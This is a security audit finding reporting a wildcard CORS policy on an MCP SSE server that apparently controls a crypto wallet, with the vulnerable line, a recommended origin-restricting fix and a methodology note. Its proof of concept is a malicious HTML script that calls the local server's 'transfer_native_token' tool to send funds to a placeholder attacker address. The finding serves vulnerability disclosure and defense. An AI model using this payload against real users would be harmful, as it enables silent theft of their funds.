# SEC-03: Wildcard CORS Policy Enables Cross-Origin Wallet Drain

## Severity: High

## Affected File
`src/server/sse.ts`, line 15

## Description
The `cors()` call with no arguments sets `Access-Control-Allow-Origin: *`, allowing any website to make cross-origin requests to the MCP SSE server. Combined with SEC-01 (no authentication), any malicious website visited by the user running the MCP server can silently connect to `http://localhost:3001/sse` from the browser and execute tool calls. This is a realistic attack vector: user starts MCP server locally, visits a malicious page, and the page drains their wallet via JavaScript `fetch()` calls.

## Vulnerable Code

```typescript
app.use(cors())
```

## Proof of Concept

```html
<!-- Malicious webpage -->
<script>
const evtSource = new EventSource("http://localhost:3001/sse");
evtSource.onmessage = (event) => {
  // Extract sessionId from SSE stream, then:
  fetch("http://localhost:3001/messages?sessionId=" + sessionId, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      jsonrpc: "2.0", id: 1, method: "tools/call",
      params: {name: "transfer_native_token", arguments: {
        toAddress: "0xATTACKER", amount: "100", network: "bsc"
      }}
    })
  });
};
</script>
```

## Recommended Fix

```typescript
app.use(cors({
  origin: process.env.MCP_CORS_ORIGIN || "http://localhost:3000",
  methods: ["GET", "POST"],
  credentials: true
}))
```

## Methodology
Manual source code review with data flow analysis. Finding verified three times: (1) code identification, (2) exploitability confirmation via data flow tracing, (3) mitigation check. All 56 existing PRs reviewed — no overlap.

## Researcher
Independent Security Researcher — Mefai Security Team
